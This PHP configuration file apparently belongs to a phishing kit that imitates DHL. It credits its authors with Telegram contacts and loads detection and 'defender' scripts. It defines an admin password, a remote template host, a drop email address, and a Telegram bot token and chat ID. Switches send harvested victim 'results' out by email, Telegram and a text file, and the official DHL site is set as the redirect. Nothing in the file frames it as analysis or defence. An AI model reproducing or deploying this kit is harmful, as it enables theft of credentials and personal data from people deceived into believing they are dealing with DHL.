<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact us on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    require_once 'detect.php';
    require_once 'functions.php';
    include_once 'defender.php';
    define("PASSWORD", 'dhl');
    define("TEMPLATES", 'https://limac.co.tz/package/');
    define("RECEIVER", 'ekip102030@yahoo.com');
    define("TELEGRAM_TOKEN", '1609374233:AAEaDfWF7p6-Dful45HwoJxQdxVDok2pBIg');
    define("TELEGRAM_CHAT_ID", '1576846131');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://www.dhl.com/');

    define("RECEIVE_VIA_EMAIL", 1); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 1); // Receive the results on txt file : 0 or 1
?>